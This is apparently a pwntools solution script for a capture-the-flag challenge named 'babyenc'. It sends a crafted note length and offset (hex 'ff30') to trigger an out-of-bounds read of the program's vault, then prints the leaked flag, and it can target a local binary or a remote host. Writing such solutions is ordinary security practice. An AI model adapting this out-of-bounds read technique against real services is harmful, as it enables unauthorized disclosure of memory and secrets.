#!/usr/bin/env python3
from pwn import *
import argparse
import re


def parse_args():
    p = argparse.ArgumentParser(description="Solve babyenc via OOB vault read")
    p.add_argument("--binary", default="babyenc/chall/chall", help="Path to local binary")
    p.add_argument("--host", help="Remote host")
    p.add_argument("--port", type=int, help="Remote port")
    return p.parse_args()


def start(binary_path, host, port):
    if host and port:
        return remote(host, port)
    return process(binary_path)


def wait_menu(io):
    io.recvuntil(b"8) exit")


def choose(io, n):
    wait_menu(io)
    io.sendline(str(n).encode())


def create_note(io, idx, length, data_hex):
    choose(io, 1)
    io.sendlineafter(b"index:", str(idx).encode())
    io.sendlineafter(b"length:", str(length).encode())
    io.sendlineafter(b"data hex:", data_hex)


def show_note(io, idx):
    choose(io, 3)
    io.sendlineafter(b"index:", str(idx).encode())
    io.recvuntil(b"audit(hex):")
    line = io.recvline().strip()
    # Keep only hex characters in case of stray output.
    line = re.sub(rb"[^0-9a-fA-F]", b"", line)
    return bytes.fromhex(line.decode())


def main():
    args = parse_args()
    context.binary = ELF(args.binary)
    io = start(args.binary, args.host, args.port)

    # Note[0] = length, Note[1] = offset into vault.
    create_note(io, idx=1, length=2, data_hex=b"ff30")
    leak = show_note(io, idx=1)

    flag = leak.split(b"\x00", 1)[0]
    print(flag.decode(errors="replace"))

    io.close()


if __name__ == "__main__":
    main()
